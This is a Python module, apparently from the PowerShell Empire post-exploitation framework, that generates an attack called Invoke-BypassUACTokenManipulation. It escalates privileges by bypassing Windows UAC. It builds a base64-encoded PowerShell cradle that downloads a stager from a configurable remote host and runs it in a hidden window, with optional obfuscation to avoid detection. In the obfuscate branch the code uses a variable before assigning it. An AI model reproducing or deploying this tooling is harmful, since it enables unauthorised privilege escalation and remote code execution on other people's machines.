from lib.common import helpers
import base64
import re

class Module:

    def __init__(self, mainMenu, params=[]):

        # Metadata info about the module, not modified during runtime
        self.info = {
            # Name for the module that will appear in module menus
            'Name': 'Invoke-BypassUACTokenManipulation',

            # List of one or more authors for the module
            'Author': ['@enigma0x3,@424f424f'],

            # More verbose multi-line description of the module
            'Description': ('Bypass UAC module based on the script released by Matt Nelson @enigma0x3 at Derbycon 2017'),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': None,

            # True if the module needs admin rights to run
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': True,

            # The language for this module
            'Language': 'powershell',

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion': '2',

            # List of any references/other comments
            'Comments': [
                'comment',
                'https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-TokenDuplication.ps1'
            ]
        }

        # Any options needed by the module, settable during runtime
        self.options = {

            'Agent': {
                'Description':   'Agent to elevate from.',
                'Required'   :   True,
                'Value'      :   ''
            },
            'Stager': {
                'Description':   'Stager file that you have hosted.',
                'Required'   :   True,
                'Value'      :   'update.php'
            },
            'Host': {
                'Description':   'Host or IP where stager is served.',
                'Required'   :   True,
                'Value'      :   ''
            },
            'UserAgent': {
                'Description':   'UserAgent for staging process',
                'Required'   :   False,
                'Value'      :   'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
            },
            'Port': {
                'Description':   'Port to connect to where stager is served',
                'Required'   :   True,
                'Value'      :   ''
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            } 

        }

        # Save off a copy of the mainMenu object to access external
        #   functionality like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters are passed as
        #   an object set to the module and the options dictionary is
        #   automatically set. This is mostly in case options are passed on
        #   the command line.
        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        stager = self.options['Stager']['Value']
        host = self.options['Host']['Value']
        userAgent = self.options['UserAgent']['Value']
        port = self.options['Port']['Value']
 
        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-BypassUACTokenManipulation.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        # If you'd just like to import a subset of the functions from the
        #   module source, use the following:
        #   script = helpers.generate_dynamic_powershell_script(moduleCode, ["Get-Something", "Set-Something"])
        script = moduleCode

        # Second method: For calling your imported source, or holding your
        #   inlined script. If you're importing source using the first method,
        #   ensure that you append to the script variable rather than set.
        #
        # The script should be stripped of comments, with a link to any
        #   original reference script included in the comments.
        #
        # If your script is more than a few lines, it's probably best to use
        #   the first method to source it.
        #
        # script += """

             
        try:
            blank_command = ""
            powershell_command = ""
            encodedCradle = ""
            cradle = "IEX \"(new-object net.webclient).downloadstring('%s:%s/%s')\"|IEX" % (host,port,stager)
            # Remove weird chars that could have been added by ISE
            n = re.compile(u'(\xef|\xbb|\xbf)')
            # loop through each character and insert null byte
            for char in (n.sub("", cradle)):
                # insert the nullbyte
                blank_command += char + "\x00"
            # assign powershell command as the new one
            powershell_command = blank_command
            # base64 encode the powershell command
            
           
            encodedCradle = base64.b64encode(powershell_command)
            
        except Exception as e:
            pass
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        scriptEnd = "Invoke-BypassUACTokenManipulation -Arguments \"-w 1 -enc %s\"" % (encodedCradle)
        script += scriptEnd
        return script
